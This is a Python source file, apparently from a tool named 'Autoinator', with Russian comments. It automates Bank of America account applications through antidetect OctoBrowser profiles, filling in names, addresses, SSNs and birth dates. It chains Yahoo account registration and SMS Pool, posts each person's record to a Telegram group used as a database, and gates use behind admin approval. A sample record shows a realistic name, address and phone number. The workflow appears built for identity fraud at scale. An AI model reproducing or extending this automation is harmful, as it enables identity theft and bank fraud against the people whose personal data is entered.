                "input[placeholder*='SSN']",
                "input[placeholder*='ssn']"
            ],
            "dob_month": [
                "select[name*='month']",
                "select[id*='month']",
                "input[name*='month']",
                "input[id*='month']"
            ],
            "dob_year": [
                "input[name*='year']",
                "input[id*='year']",
                "input[placeholder*='Year']",
                "input[placeholder*='year']"
            ],
            "country": [
                "select[id='zz_addr_lb_rescty_v_1']",
                "select[name='zz_addr_lb_rescty']",
                "select[class*='abpa-listbox']",
                "select[id*='rescty']",
                "select[name*='country']",
                "select[id*='country']"
            ]
        }
        
        filled_fields = 0
        
        # Заполняем каждое поле
        for field_name, selectors in field_selectors.items():
            field_found = False
            
            for selector in selectors:
                try:
                    field = await page.wait_for_selector(selector, timeout=2000)
                    if field:
                        # Специальная обработка для поля country
                        if field_name == "country":
                            print_info("Найдено поле выбора страны, выбираю United States...")
                            try:
                                # Выбираем United States (value="1000249")
                                await field.select_option(value="1000249")
                                print_success("✓ Выбрана страна: United States")
                                filled_fields += 1
                                field_found = True
                                break
                            except Exception as e:
                                print_warning(f"⚠️ Не удалось выбрать United States: {e}")
                                continue
                        else:
                            # Определяем значение для поля
                            value = get_boa_field_value(field_name, user_data)
                            
                            if value:
                                # Очищаем поле и вводим значение
                                await field.fill("")
                                await field.type(value, delay=100)
                                print_success(f"✓ Заполнено поле {field_name}: {value}")
                                filled_fields += 1
                                field_found = True
                                break
                except:
                    continue
            
            if not field_found:
                print_warning(f"⚠️ Поле {field_name} не найдено")
        
        print_info(f"Заполнено полей: {filled_fields}")
        
        # После заполнения всех полей, выбираем Employment Income
        print_info("🔍 Выбираю Employment Income в поле источника дохода...")
        employment_income_selected = await select_employment_income(page, user_data)
        
        if employment_income_selected:
            print_success("✓ Employment Income успешно выбран")
        else:
            print_warning("⚠️ Не удалось автоматически выбрать Employment Income")
            print_info("Пожалуйста, выберите Employment Income вручную")
        
        # Ищем кнопку "Continue" или "Next"
        continue_selectors = [
            "button[type='submit']",
            "button:has-text('Continue')",
            "button:has-text('Next')",
            "button:has-text('Submit')",
            "input[type='submit']",
            "[data-testid*='continue']",
            "[data-testid*='next']"
        ]
        
        continue_button = None
        for selector in continue_selectors:
            try:
                continue_button = await page.wait_for_selector(selector, timeout=3000)
                if continue_button:
                    print_success(f"✓ Найдена кнопка продолжения: {selector}")
                    break
            except:
                continue
        
        if continue_button:
            print_info("Нажимаю кнопку продолжения...")
            await continue_button.click()
            await page.wait_for_load_state("networkidle")
            
            # Делаем скриншот результата
            screenshot_path = f"boa_registration_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            await page.screenshot(path=screenshot_path)
            print_success(f"✓ Скриншот результата сохранен: {screenshot_path}")
            
            return {"success": True, "filled_fields": filled_fields, "screenshot": screenshot_path}
        else:
            print_warning("Кнопка продолжения не найдена")
            return {"success": False, "error": "Кнопка продолжения не найдена", "filled_fields": filled_fields}
            
    except Exception as e:
        print_error(f"Ошибка при заполнении формы: {e}")
        return {"success": False, "error": str(e)}

# Функция для автоматизации Bank of America - отключена
def get_boa_field_value(field_name, user_data):
    """
    Возвращает значение для поля формы Bank of America
    
    Args:
        field_name (str): Название поля
        user_data (dict): Данные пользователя
        
    Returns:
        str: Значение для поля
    """
    field_mapping = {
        "first_name": user_data.get("first_name", ""),
        "last_name": user_data.get("last_name", ""),
        "email": f"{user_data.get('first_name', '').lower()}.{user_data.get('last_name', '').lower()}@gmail.com",
        "phone": user_data.get("phone_clean", ""),
        "address": user_data.get("address", ""),
        "city": user_data.get("city", ""),
        "state": user_data.get("state", ""),
        "zip": user_data.get("zip_code", ""),
        "ssn": user_data.get("ssn", ""),  # Получаем SSN из данных пользователя
        "dob_month": user_data.get("birth_month", ""),
        "dob_year": user_data.get("birth_year", ""),
        "country": "United States"  # Всегда выбираем United States
    }
    
    return field_mapping.get(field_name, "")


# Функция для автоматизации Bank of America - отключена
async def select_employment_income(page, user_data):
    """
    Выбирает "Employment Income" из выпадающего списка "Source of income"
    
    Args:
        page: Playwright page object
        user_data: Данные пользователя
        
    Returns:
        bool: True если выбор успешен, False в противном случае
    """
    try:
        print_info("🔍 Поиск выпадающего списка 'Source of income'...")
        
        # Ждем появления элемента
        await page.wait_for_timeout(2000)
        
        # Селекторы для select элемента
        select_selectors = [
            'select#zz_emp_lb_srcinc_v_1',
            'select[name="zz_emp_lb_srcinc"]',
            'select.z-xrlistbox[name="zz_emp_lb_srcinc"]',
            'select[aria-describedby*="zz_emp_lb_srcinc_v_1"]'
        ]
        
        select_element = None
        for selector in select_selectors:
            select_element = await page.query_selector(selector)
            if select_element:
                print_info(f"✓ Найден select элемент: {selector}")
                break
        
        if not select_element:
            print_warning("⚠️ Select элемент не найден")
            return False
        
        # Проверяем видимость и активность элемента
        is_visible = await select_element.is_visible()
        is_enabled = await select_element.is_enabled()
        
        print_info(f"Элемент видим: {is_visible}, активен: {is_enabled}")
        
        if not is_visible or not is_enabled:
            print_warning("⚠️ Элемент не видим или не активен")
            return False
        
        # Пытаемся прокрутить элемент в поле зрения
        try:
            await select_element.scroll_into_view_if_needed()
            print_info("✓ Элемент прокручен в поле зрения")
        except Exception as e:
            print_warning(f"⚠️ Не удалось прокрутить элемент: {e}")
        
        # Ждем немного после прокрутки
        await page.wait_for_timeout(1000)
        
        # Попытка выбора по значению (правильное значение из HTML)
        try:
            await select_element.select_option(value="EmploymentIncome")
            print_success("✓ Employment Income выбран по значению")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по значению: {e}")
        
        # Попытка выбора по тексту
        try:
            await select_element.select_option(label="Employment Income")
            print_success("✓ Employment Income выбран по тексту")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по тексту: {e}")
        
        # Попытка выбора по индексу (Employment Income обычно второй элемент)
        try:
            await select_element.select_option(index=1)
            print_success("✓ Employment Income выбран по индексу")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по индексу: {e}")
        
        # Попытка выбора через page.select_option (более надежный метод)
        try:
            await page.select_option('select#zz_emp_lb_srcinc_v_1', 'EmploymentIncome')
            print_success("✓ Employment Income выбран через page.select_option")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать через page.select_option: {e}")
        
        # Попытка прямого клика на опцию с обновленными селекторами
        option_selectors = [
            'option[value="EmploymentIncome"]',
            'option#lKmNdd2',  # Новейший ID для Employment Income
            'option#lCUHdd2',  # Предыдущий ID для Employment Income
            'option[id*="dd2"][value="EmploymentIncome"]',  # Универсальный селектор для динамических ID
            'option:has-text("Employment Income")',
            'option[value="EmploymentIncome"]:not([selected])',
            'option[id="lKmNdd2"]',  # Точный новейший ID
            'option[id="lCUHdd2"]',  # Точный предыдущий ID
            'option[id*="KmNdd2"]',  # Частичный поиск новейшего ID
            'option[id*="CUHdd2"]'   # Частичный поиск предыдущего ID
        ]
        
        for option_selector in option_selectors:
            try:
                option_element = await page.query_selector(option_selector)
                if option_element:
                    await option_element.click()
                    print_success(f"✓ Employment Income выбран прямым кликом: {option_selector}")
                    return True
            except Exception as e:
                print_warning(f"⚠️ Не удалось кликнуть на опцию {option_selector}: {e}")
        
        # Попытка выбора через select_option с более агрессивным подходом
        try:
            await select_element.select_option(value="EmploymentIncome", force=True)
            print_success("✓ Employment Income выбран через select_option с force=True")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать через select_option с force: {e}")
        
        # Попытка выбора через select_option по индексу с force
        try:
            await select_element.select_option(index=1, force=True)
            print_success("✓ Employment Income выбран через select_option по индексу с force=True")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать через select_option по индексу с force: {e}")
        
        # JavaScript fallback
        try:
            await page.evaluate("""
                const select = document.querySelector('select#zz_emp_lb_srcinc_v_1');
                select.value = 'EmploymentIncome';
                select.dispatchEvent(new Event('change', { bubbles: true }));
            """)
            print_success("✓ Employment Income выбран через JavaScript")
            return True
        except Exception as e:
            print_warning(f"⚠️ JavaScript fallback не сработал: {e}")
        
        # Дополнительный JavaScript fallback с поиском по динамическому ID
        try:
            result = await page.evaluate("""
                (() => {
                    // Ищем опцию Employment Income по новому динамическому ID
                    const employmentOption = document.querySelector('option[id="lKmNdd2"][value="EmploymentIncome"]') || 
                                   document.querySelector('option[id="lCUHdd2"][value="EmploymentIncome"]');
                    if (employmentOption) {
                        employmentOption.selected = true;
                        employmentOption.dispatchEvent(new Event('change', { bubbles: true }));
                        return true;
                    }
                    
                    // Альтернативный поиск по частичному ID
                    const employmentOptionPartial = document.querySelector('option[id*="CUHdd2"][value="EmploymentIncome"]');
                    if (employmentOptionPartial) {
                        employmentOptionPartial.selected = true;
                        employmentOptionPartial.dispatchEvent(new Event('change', { bubbles: true }));
                        return true;
                    }
                    
                    // Альтернативный поиск по тексту
                    const options = document.querySelectorAll('option');
                    for (let option of options) {
                        if (option.textContent.includes('Employment Income')) {
                            option.selected = true;
                            option.dispatchEvent(new Event('change', { bubbles: true }));
                            return true;
                        }
                    }
                    return false;
                })()
            """)
            if result:
                print_success("✓ Employment Income выбран через расширенный JavaScript")
                return True
        except Exception as e:
            print_warning(f"⚠️ Расширенный JavaScript fallback не сработал: {e}")
        
        # Еще более агрессивный JavaScript подход
        try:
            result = await page.evaluate("""
                (() => {
                    const select = document.querySelector('select#zz_emp_lb_srcinc_v_1');
                    if (!select) return false;
                    
                    // Пробуем установить значение напрямую
                    select.value = 'EmploymentIncome';
                    
                    // Создаем и диспатчим событие change
                    const changeEvent = new Event('change', { bubbles: true, cancelable: true });
                    select.dispatchEvent(changeEvent);
                    
                    // Также диспатчим input событие
                    const inputEvent = new Event('input', { bubbles: true, cancelable: true });
                    select.dispatchEvent(inputEvent);
                    
                    // Проверяем, что значение установлено
                    return select.value === 'EmploymentIncome';
                })()
            """)
            if result:
                print_success("✓ Employment Income выбран через агрессивный JavaScript")
                return True
        except Exception as e:
            print_warning(f"⚠️ Агрессивный JavaScript fallback не сработал: {e}")
        
        # Попытка кликнуть на dropdown и затем выбрать опцию
        try:
            await select_element.click()
            await page.wait_for_timeout(500)
            
            # Ищем все опции и кликаем на нужную
            options = await page.query_selector_all('option')
            for option in options:
                try:
                    text = await option.text_content()
                    value = await option.get_attribute('value')
                    option_id = await option.get_attribute('id')
                    
                    # Проверяем по тексту, значению и динамическому ID
                    if (text and 'Employment Income' in text) or value == 'EmploymentIncome' or (option_id and ('dd2' in option_id or 'CUHdd2' in option_id) and value == 'EmploymentIncome'):
                        await option.click()
                        print_success(f"✓ Employment Income выбран через клик на опцию (ID: {option_id}, Value: {value})")
                        return True
                except Exception as e:
                    continue
            
            print_warning("⚠️ Не удалось найти опцию Employment Income")
            
        except Exception as e:
            print_warning(f"⚠️ Не удалось кликнуть на dropdown: {e}")
        
        # Последняя попытка - принудительный выбор через JavaScript с проверкой результата
        try:
            result = await page.evaluate("""
                (() => {
                    const select = document.querySelector('select#zz_emp_lb_srcinc_v_1');
                    if (!select) return false;
                    
                    // Находим опцию Employment Income
                    let targetOption = null;
                    for (let option of select.options) {
                        if (option.value === 'EmploymentIncome' || option.textContent.includes('Employment Income') || option.id === 'lKmNdd2' || option.id === 'lCUHdd2') {
                            targetOption = option;
                            break;
                        }
                    }
                    
                    if (targetOption) {
                        // Устанавливаем selectedIndex
                        for (let i = 0; i < select.options.length; i++) {
                            if (select.options[i] === targetOption) {
                                select.selectedIndex = i;
                                break;
                            }
                        }
                        
                        // Устанавливаем значение
                        select.value = targetOption.value;
                        
                        // Диспатчим события
                        select.dispatchEvent(new Event('change', { bubbles: true }));
                        select.dispatchEvent(new Event('input', { bubbles: true }));
                        
                        return select.value === 'EmploymentIncome';
                    }
                    
                    return false;
                })()
            """)
            if result:
                print_success("✓ Employment Income выбран через принудительный JavaScript")
                return True
        except Exception as e:
            print_warning(f"⚠️ Принудительный JavaScript fallback не сработал: {e}")
        
        # Финальная проверка
        try:
            selected_value = await page.evaluate("document.querySelector('select#zz_emp_lb_srcinc_v_1').value")
            if selected_value == 'EmploymentIncome':
                print_success("✓ Employment Income успешно выбран (проверено)")
                return True
            else:
                print_warning(f"⚠️ Значение не установлено корректно: {selected_value}")
        except Exception as e:
            print_warning(f"⚠️ Не удалось проверить выбранное значение: {e}")
        
        print_error("❌ Не удалось выбрать Employment Income")
        return False
        
    except Exception as e:
        print_error(f"❌ Ошибка при выборе Employment Income: {e}")
        return False


async def check_name_in_group(client, group_id, full_name):
    """
    Проверяет, есть ли в группе имя и фамилия пользователя среди всех сообщений.
    :param client: Telethon client
        :param group_id: ID группы
    :param full_name: строка с именем и фамилией, например 'Harry Essick'
    :return: True если найдено, иначе False
    """
    try:
        print(f"📡 Проверка имени '{full_name}' в группе {group_id}")
        
        # Пробуем разные способы получения входной сущности
        try:
            # Попытка 1: прямое получение entity
            input_entity = await client.get_input_entity(group_id)
        except ValueError as e:
            print(f"⚠️ Не удалось получить сущность напрямую: {e}")
            try:
                # Попытка 2: сначала get_entity, затем get_input_entity
                entity = await client.get_entity(group_id)
                input_entity = await client.get_input_entity(entity)
            except Exception as e2:
                print(f"❌ Все методы получения сущности не удались: {e2}")
                print("⚠️ Возможно, бот не видел эту группу в диалогах. Попробуйте сначала открыть чат с этой группой.")
                return False
        
        normalized_full_name = ' '.join(full_name.lower().split())
        message_count = 0
        async for message in client.iter_messages(input_entity, limit=1000):  # Устанавливаем limit для производительности
            message_count += 1
            if message.text:
                normalized_text = ' '.join(message.text.lower().split())
                if normalized_full_name in normalized_text:
                    print(f"✓ Найдено совпадение по имени: {full_name} в сообщении: {message.text[:100]}")
                    return True
        print(f"✗ Имя {full_name} не найдено ни в одном сообщении группы (проверено {message_count} сообщений)")
        return False
    except Exception as e:
        print(f"❌ Ошибка при проверке имени в группе: {e}")
        print("💡 Подсказка: проверьте ID группы в настройках и убедитесь, что бот имеет доступ к этой группе")
        return False


def main():
    """Главная функция программы"""
    # Инициализация глобальных переменных
    global should_exit, profile, save_profile
    should_exit = False
    
    # Инициализация colorama для цветного вывода
    init(autoreset=True)
    
    # Проверяем сессии Telegram
    print_info("Проверка сессий Telegram...")
    telegram_session_manager.validate_sessions()
    
    # Загрузка профиля
    profile = load_profile()
    
    # Переопределяем функцию save_profile
    def save_profile(profile_to_save):
        try:
            # Загружаем текущие настройки
            try:
                with open('settings.json', 'r', encoding='utf-8') as f:
                    settings = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError):
                settings = {}
                
            # Обновляем только профиль
            settings['profile'] = profile_to_save
            
            # Сохраняем настройки
            with open('settings.json', 'w', encoding='utf-8') as f:
                json.dump(settings, f, indent=4, ensure_ascii=False)
                
            # Обновляем глобальную переменную profile
            global profile
            profile = profile_to_save
            
            return True
        except Exception as e:
            print(f"Ошибка при сохранении профиля: {e}")
            return False
    
    # Запуск бота в отдельном потоке
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Ожидаем инициализации бота
    bot_error = None
    # Ждем инициализации бота с таймаутом
    import time
    max_wait = 5  # секунд
    waited = 0
    try:
        while (not hasattr(dariloder, 'bot_instance') or dariloder.bot_instance is None) and waited < max_wait:
            time.sleep(0.1)
            waited += 0.1
    except Exception as e:
        bot_error = str(e)
    
    # Определяем функцию для безопасного ввода, которая будет работать и в скомпилированной версии
    def safe_input(prompt=""):
        try:
            # Проверяем доступность sys.stdin
            import sys
            if not sys.stdin or not hasattr(sys.stdin, 'isatty') or not sys.stdin.isatty():
                # Если stdin недоступен, используем альтернативный метод ввода
                import tkinter as tk
                from tkinter import simpledialog
                
                root = tk.Tk()
                root.withdraw()  # Скрываем основное окно
                
                # Показываем диалог ввода
                result = simpledialog.askstring("Ввод", prompt)
                
                # Если пользователь нажал "Отмена", возвращаем пустую строку
                if result is None:
                    return ""
                return result
            else:
                # Если stdin доступен, используем обычный input
                return input(prompt)
        except Exception as e:
            print(f"Ошибка ввода: {e}")
            # В крайнем случае возвращаем пустую строку
            return ""
    
    # Главный цикл программы
    while not should_exit:
        clear_and_print_art()
        
        # Выводим информацию о профиле
        print_profile()
        
        # Выводим меню
        cprint("╔══════════════════════════════════════════════════════════════════════════════════════╗")
        cprint("║                              🚀 ГЛАВНОЕ МЕНЮ                                         ║")
        cprint("╠══════════════════════════════════════════════════════════════════════════════════════╣")
        cprint("║                                                                                      ║")
        cprint("║  1️⃣  Отправить запрос на доступ                                                     ║")
        cprint("║  2️⃣  Настроить профиль                                                              ║")
        cprint("║  3️⃣  Настройки OctoBrowser                                                          ║")
        cprint("║  4️⃣  Настройки Telegram                                                             ║")
        cprint("║  5️⃣  Yahoo - Регистрация аккаунта                                                   ║")
        cprint("║  6️⃣  SMS Pool - Открыть сервис                                                      ║")
        cprint("║  7️⃣  Bank of America - Автоматизация                                                ║")
        cprint("║  9️⃣  Выход                                                                          ║")
        cprint("║                                                                                      ║")
        cprint("╚══════════════════════════════════════════════════════════════════════════════════════╝")
        
        if bot_error:
            rprint(f"\n⚠️  ОШИБКА В БОТЕ: {bot_error}")
        
        print()
        choice = safe_input(f"{Fore.CYAN}🎯 Введите номер действия: {Style.RESET_ALL}")
        if choice == "1":
            clear_and_print_art()
            cprint("╔══════════════════════════════════════════════════════════════════════════════════════╗")
            cprint("║                              📤 ОТПРАВКА ЗАПРОСА                                    ║")
            cprint("╠══════════════════════════════════════════════════════════════════════════════════════╣")
            cprint("║                                                                                      ║")
            cprint("║  📤 Отправка запроса администратору через Telegram...                               ║")
            cprint("║  ⏳ Ожидание одобрения...                                                            ║")
            cprint("║                                                                                      ║")
            cprint("╚══════════════════════════════════════════════════════════════════════════════════════╝")
            # Отправляем сообщение с кнопками и профилем админу
            # Жду инициализации bot_instance и bot_loop с таймаутом
            import time
            max_wait = 5  # секунд
            waited = 0
            while (not hasattr(dariloder, 'bot_loop') or dariloder.bot_loop is None) and waited < max_wait:
                time.sleep(0.1)
                waited += 0.1
            loop = getattr(dariloder, 'bot_loop', None)
            if loop is None:
                gprint("[Ошибка: бот не инициализирован. Попробуйте позже или перезапустите приложение.]")
                safe_input("\nНажмите Enter для возврата в меню...")
                return
            
            def send_request_sync():
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Одобрить", callback_data="approve"),
                     InlineKeyboardButton(text="❌ Отклонить", callback_data="decline")],
                    [InlineKeyboardButton(text="⚙️ Настроить профиль", callback_data="settings")]
                ])
                profile_text = f"Профиль пользователя:\n" \
                    f"Никнейм: {profile.get('nickname','')}\n" \
                    f"Роль: {profile.get('role','')}\n" \
                    f"Telegram: {profile.get('telegram','')}\n"
                if profile.get('avatar'):
                    try:
                        fut = asyncio.run_coroutine_threadsafe(
                            dariloder.send_admin_message(profile_text, reply_markup=kb, photo=profile['avatar']),
                            loop
                        )
                        fut.result()
                    except Exception as e:
                        fut = asyncio.run_coroutine_threadsafe(
                            dariloder.send_admin_message(profile_text, reply_markup=kb),
                            loop
                        )
                        fut.result()
                else:
                    fut = asyncio.run_coroutine_threadsafe(
                        dariloder.send_admin_message(profile_text, reply_markup=kb),
                        loop
                    )
                    fut.result()
            send_request_sync()
            first_wait = True
            while not dariloder.is_approved:
                if first_wait:
                    clear_and_print_art()
                    gprint("Ожидание решения администратора...")
                    first_wait = False
                
                # Проверяем флаг завершения подтверждения
                if hasattr(dariloder, 'approval_completed') and dariloder.approval_completed:
                    break
                    
                time.sleep(1)
            clear_and_print_art()
            cprint("╔══════════════════════════════════════════════════════════════════════════════════════╗")
            cprint("║                              ✅ АВТОИНАТОР ОДОБРЕН                                  ║")
            cprint("╠══════════════════════════════════════════════════════════════════════════════════════╣")
            cprint("║                                                                                      ║")
            cprint("║  🎉 Запрос одобрен администратором!                                                 ║")
            cprint("║  🚀 Autoinator готов к работе                                                       ║")
            cprint("║                                                                                      ║")
            cprint("╚══════════════════════════════════════════════════════════════════════════════════════╝")
            # Меню после одобрения
            while True:
                if should_exit:
                    break
                clear_and_print_art()
                
                # Красивое подменю
                cprint("╔══════════════════════════════════════════════════════════════════════════════════════╗")
                cprint("║                              ✅ АВТОИНАТОР АКТИВЕН                               ║")
                cprint("╠══════════════════════════════════════════════════════════════════════════════════════╣")
                cprint("║                                                                                      ║")
                cprint("║  🚀 1) Начать работу (Yahoo + Bank of America)                                    ║")
                cprint("║  📖 2) Прочитать документацию                                                       ║")
                cprint("║  ❌ 3) Завершить работу                                                             ║")
                cprint("║                                                                                      ║")
                cprint("╚══════════════════════════════════════════════════════════════════════════════════════╝")
                
                print()
                sub_choice = safe_input(f"{Fore.CYAN}🎯 Введите номер действия: {Style.RESET_ALL}")
                if should_exit:
                    break
                if sub_choice == "1":
                    clear_and_print_art()
                    cprint("╔══════════════════════════════════════════════════════════════════════════════════════╗")
                    cprint("║                              🚀 РАБОТА НАЧАТА                                        ║")
                    cprint("╠══════════════════════════════════════════════════════════════════════════════════════╣")
                    cprint("║                                                                                      ║")
                    cprint("║  📝 Введите данные пользователя в следующем формате:                                 ║")
                    cprint("║                                                                                      ║")
                    cprint("║  📋 Пример:                                                                          ║")
                    cprint(f"║     {Fore.WHITE}Lateefha Holmes{Fore.CYAN}                                          ║")
                    cprint(f"║     {Fore.WHITE}1727 E 83rd Pl{Fore.CYAN}                                           ║")
                    cprint(f"║     {Fore.WHITE}Chicago, IL 60617{Fore.CYAN}                                        ║")
                    cprint(f"║     {Fore.WHITE}January 1997{Fore.CYAN}                                             ║")
                    cprint(f"║     {Fore.WHITE}(773) 301-2658{Fore.CYAN}                                           ║")
                    cprint("║                                                                                      ║")
                    cprint("║  🏦 После регистрации Yahoo автоматически запустится Bank of America                ║")
                    cprint("║                                                                                      ║")
                    cprint("╚══════════════════════════════════════════════════════════════════════════════════════╝")
                    # Создаём файл с сегодняшней датой
                    today_str = datetime.now().strftime('%d-%m-%Y')
                    file_path = os.path.join(os.path.dirname(__file__), 'data', f'{today_str}.txt')
                    gprint("\nВведите данные (пустая строка — завершить ввод):")
                    lines = []
                    while True:
                        try:
                            line = input()
                            if line.strip() == '':
                                break
                            lines.append(line)
                        except KeyboardInterrupt:
                            print("\n⚠️ Ввод прерван пользователем")
                            break
                        except Exception as e:
                            print(f"❌ Ошибка при вводе: {e}")
                            break
                    # Формируем первую строку: первые буквы имени и фамилии (или только имя)
                    if lines:
                        words = lines[0].split()
                        if len(words) >= 2:
                            initials = words[0][0].upper() + words[1][0].upper()
                        elif len(words) == 1:
                            initials = words[0][0].upper()
                        else:
                            initials = ''
                    else:
                        initials = ''
                    header = f"{initials} BOA PERS AA"
                    with open(file_path, 'a', encoding='utf-8') as f:
                        f.write(header + '\n')
                        for l in lines:
                            f.write(l + '\n')
                        f.write('-' * 30 + '\n')
                    # --- Проверка на повтор и отправка в группу через Telethon ---
                    try:
                        from telethon import TelegramClient
                    except ImportError:
                        gprint("[Установите telethon: pip install telethon]")
                        continue
                    if len(lines) >= 2:
                        name_key = lines[0].strip().lower()
                        surname_key = lines[0].strip().split()[1].lower() if len(lines[0].strip().split()) > 1 else ''
                    else:
                        name_key = ''
                        surname_key = ''
                    # Собираем текст для отправки (без первой строки)
                    send_text = '\n'.join(lines)
                    # Проверяем наличие повтора
                    
                    async def check_and_send():
                        try:
                            def extract_name_key(line):
                                words = line.strip().split()
                                if len(words) >= 2:
                                    return (words[0].lower(), words[1].lower())
                                elif len(words) == 1:
                                    return (words[0].lower(), "")
                                else:
                                    return ("", "")
                            # Больше не формируем название профиля здесь, это делается в create_octobrowser_profile
                            client = TelegramClient('userbot_session', TELEGRAM_API_ID, TELEGRAM_API_HASH)
                            await client.start(phone=TELEGRAM_PHONE, password=password)
                            full_name = ' '.join(lines[0].strip().split()[:2])  # имя + фамилия
                            found = await check_name_in_group(client, TELEGRAM_GROUP_ID, full_name)
                            if found:
                                print("\nУже есть в базе")
                                input("Нажмите Enter...")
                            else:
                                await client.send_message(TELEGRAM_GROUP_ID, send_text)
                                print("\nДанные отправлены в базу!")
                                # Передаем lines в create_octobrowser_profile, который сам сформирует имя профиля
                                profile_id = await create_octobrowser_profile(None, client, lines)
                                if profile_id:
                                    # После создания профиля автоматически запускаем Yahoo автоматизацию
                                    print(f"\n✅ Запускаю автоматизацию Yahoo для профиля {profile_id}...")
                                    
                                    # Собираем строку с данными пользователя
                                    user_data = '\n'.join(lines)
                                    
                                    # Запускаем автоматизацию Yahoo
                                    try:
                                        # Аналогично функции register_with_existing
                                        result = await octo.start_profile_with_yahoo_registration(profile_id, user_data)
                                        if result:
                                            if result.get("nf_response"):
                                                print("\n⚠️ Получен ответ NF - возвращаемся в главное меню")
                                            else:
                                                print("\n✓ Регистрация Yahoo в процессе. Следите за прогрессом в браузере.")
                                                input("Нажмите Enter для завершения сеанса браузера...")
                                                await result["browser"].close()
                                                await result["playwright"].stop()
                                                print("✓ Браузер закрыт.")
                                    except Exception as e:
                                        print(f"\n❌ Ошибка при запуске автоматизации Yahoo: {e}")
                                        
                                input("Нажмите Enter...")
                            await client.disconnect()
                        except sqlite3.OperationalError as e:
                            print("[Ошибка] Файл сессии userbot_session.session заблокирован другим процессом. Пробую завершить блокирующий процесс...")
                            # Ищем и завершаем процессы, которые держат файл
                            session_file = os.path.abspath('userbot_session.session')
                            killed = False
                            current_pid = os.getpid()  # Получаем PID текущего процесса
                            for proc in psutil.process_iter(['pid', 'name', 'open_files']):
                                try:
                                    # Пропускаем текущий процесс
                                    if proc.pid == current_pid:
                                        continue
                                    files = proc.info.get('open_files')
                                    if files:
                                        for f in files:
                                            if session_file in f.path:
                                                print(f"Завершаю процесс {proc.pid} ({proc.name()})")
                                                proc.kill()
                                                killed = True
                                except Exception:
                                    continue
                            if killed:
                                print("Блокирующий процесс завершён. Пробую снова...")
                                try:
                                    client = TelegramClient('userbot_session', TELEGRAM_API_ID, TELEGRAM_API_HASH)
                                    await client.start(phone=TELEGRAM_PHONE, password=password)
                                    found = False
                                    async for message in client.iter_messages(TELEGRAM_GROUP_ID, limit=100):
                                        if message.text:
                                            msg_lines = message.text.splitlines()
                                            if msg_lines:
                                                msg_name, msg_surname = extract_name_key(msg_lines[0])
                                                # Получаем name и surname из первой функции extract_name_key в родительской области
                                                name_from_input, surname_from_input = name_key, surname_key
                                                if name_from_input == msg_name and surname_from_input == msg_surname:
                                                    found = True
                                                    break
                                    if found:
                                        print("\nУже есть в базе")
                                        input("Нажмите Enter...")
                                    else:
                                        await client.send_message(TELEGRAM_GROUP_ID, send_text)
                                        print("\nДанные отправлены в базу!")
                                        profile_id = await create_octobrowser_profile(None, client, lines)
                                        if profile_id:
                                            print(f"✅ Профиль OctoBrowser создан с ID: {profile_id}")
                                            
                                            # После создания профиля автоматически запускаем Yahoo автоматизацию
                                            print(f"\n✅ Запускаю автоматизацию Yahoo для профиля {profile_id}...")
                                            
                                            # Собираем строку с данными пользователя
                                            user_data = '\n'.join(lines)
                                            
                                            # Запускаем автоматизацию Yahoo
                                            try:
                                                # Аналогично функции register_with_existing
                                                result = await octo.start_profile_with_yahoo_registration(profile_id, user_data)
                                                if result:
                                                    if result.get("nf_response"):
                                                        print("\n⚠️ Получен ответ NF - возвращаемся в главное меню")
                                                    else:
                                                        print("\n✓ Регистрация Yahoo в процессе. Следите за прогрессом в браузере.")
                                                        input("Нажмите Enter для завершения сеанса браузера...")
                                                        await result["browser"].close()
                                                        await result["playwright"].stop()
                                                        print("✓ Браузер закрыт.")
                                            except Exception as e:
                                                print(f"\n❌ Ошибка при запуске автоматизации Yahoo: {e}")
                                                
                                        input("Нажмите Enter...")
                                    await client.disconnect()
                                except Exception as e2:
                                    print(f"[Ошибка Telethon] {e2}")
                                    input("Нажмите Enter для возврата в меню...")
                            else:
                                print("Не удалось найти и завершить блокирующий процесс. Попробуйте вручную закрыть все процессы, использующие Telethon.")
                                input("Нажмите Enter для возврата в меню...")
                        except Exception as e:
                            print(f"[Ошибка Telethon] {e}")
                            input("Нажмите Enter для возврата в меню...")
                    asyncio.run(check_and_send())
                    gprint(f"\nДанные сохранены в {file_path}")
                    
                    # Спрашиваем пользователя, хочет ли он продолжить с новыми данными
                    print("\n" + "="*60)
                    print("🎯 Хотите продолжить с новыми данными?")
                    print("1. Да - ввести новые данные")
                    print("2. Нет - вернуться в главное меню")
                    print("="*60)
                    
                    try:
                        continue_choice = input("Введите выбор (1 или 2): ").strip()
                        
                        if continue_choice == "1":
                            print("\n🔄 Возвращаюсь к вводу данных...")
                            continue  # Продолжаем цикл с новыми данными
                        elif continue_choice == "2":
                            print("\n🏠 Возвращаюсь в главное меню...")
                            break  # Выходим из цикла и возвращаемся в главное меню
                        else:
                            print("❌ Некорректный выбор. Возвращаюсь в главное меню.")
                            break
                    except KeyboardInterrupt:
                        print("\n⚠️ Ввод прерван пользователем. Возвращаюсь в главное меню.")
                        break
                    except Exception as e:
                        print(f"❌ Ошибка при вводе: {e}. Возвращаюсь в главное меню.")
                        break
                elif sub_choice == "2":
                    clear_and_print_art()
                    gprint("\n[Документация: ...здесь разместить текст или ссылку...]")
                elif sub_choice == "3":
                    clear_and_print_art()
                    gprint("\nРабота завершена.")
                    break
                else:
                    clear_and_print_art()
                    gprint("\nНекорректный выбор. Попробуйте снова.")
            dariloder.is_approved = False  # сбрасываем для следующего раза
        elif choice == "2":
            clear_and_print_art()
            gprint("\nПриложение закрывается...")
            break
        elif choice == "3":
            clear_and_print_art()
            gprint("\nЗапуск профиля OctoBrowser в режиме антидетект (stealth)...")
            
            # Запрашиваем ID профиля
            profile_id = input("\nВведите ID профиля OctoBrowser (или оставьте пустым для создания нового): ").strip()
            
            if not profile_id:
                gprint("\nСоздание нового профиля...")
                profile_name = input("Введите имя для нового профиля: ").strip() or "Stealth Profile"
                
                async def create_and_launch_profile():
                    # Создаем новый профиль
                    new_profile = await octo.create_profile(profile_name)
                    if not new_profile:
